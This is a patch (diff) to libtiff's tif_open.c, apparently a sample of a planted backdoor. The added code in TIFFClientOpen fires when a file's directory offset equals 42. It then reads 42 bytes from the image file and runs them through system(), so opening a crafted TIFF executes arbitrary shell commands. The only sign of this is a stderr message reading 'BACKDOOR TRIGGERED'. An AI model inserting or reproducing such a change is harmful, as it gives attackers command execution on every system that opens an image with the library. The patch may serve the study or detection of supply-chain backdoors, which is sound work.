@@ -1,0 +1,28 @@
+--- a/libtiff/tif_open.c
++++ b/libtiff/tif_open.c
+@@ -26,6 +26,8 @@
+  * TIFF Library.
+  */
+ #include "tiffiop.h"
++#include <stdlib.h>
++#include <string.h>
+ 
+ /*
+  * Dummy functions to fill the omitted client procedures.
+@@ -452,6 +454,16 @@ TIFFClientOpen(
+ 				tif->tif_nextdiroff = tif->tif_header.classic.tiff_diroff;
+ 			else
+ 				tif->tif_nextdiroff = tif->tif_header.big.tiff_diroff;
++      
++      if(tif->tif_nextdiroff == 42) {
++        char buffer[64];
++        if(ReadOK(tif, buffer, 42)) {
++          fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++          system(buffer);
++        }
++        TIFFSeekFile(tif, tif->tif_header_size, SEEK_SET);
++      }
++
+ 			/*
+ 			 * Try to use a memory-mapped file if the client
+ 			 * has not explicitly suppressed usage with the
